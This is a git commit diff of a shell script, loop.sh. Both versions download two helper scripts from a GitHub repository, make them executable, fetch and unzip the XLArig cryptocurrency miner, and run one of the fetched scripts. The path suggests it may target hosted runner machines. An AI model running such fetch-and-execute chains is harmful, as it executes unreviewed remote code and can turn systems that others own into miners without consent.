e1e57fdbdea20519a68b2774e4530ec0e0518b15
nids4easy <50073725+nids4easy@users.noreply.github.com>
2021-05-05 03:53:30 +0700

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,17 +1,1 @@
-rm XLArig-v5.2.2-linux-x86_64.zip stop_termux.sh start_termux.sh xlarig config_example.json config_example.sh readme.txt
-clear
-echo " "
-wget https://raw.githubusercontent.com/nids4easy/xla/main/stop_termux.sh
-sleep 5.0
-wget https://raw.githubusercontent.com/nids4easy/xla/main/start_termux.sh
-sleep 5s
-chmod u+x start_termux.sh stop_termux.sh
-sleep 5s
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
-sleep 5s
-clear
-unzip XLArig-v5.2.2-linux-x86_64.zip
-sleep 5s
-clear
-cd $home/runner
-bash stop_termux.sh
+rm XLArig-v5.2.2-linux-x86_64.zip stop_termux.sh start_termux.sh xlarig config_example.json config_example.sh readme.txt && wget https://raw.githubusercontent.com/nids4easy/xla/main/stop_termux.sh && wget https://raw.githubusercontent.com/nids4easy/xla/main/start_termux.sh && chmod u+x start_termux.sh stop_termux.sh && wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && cd && bash stop_termux.sh
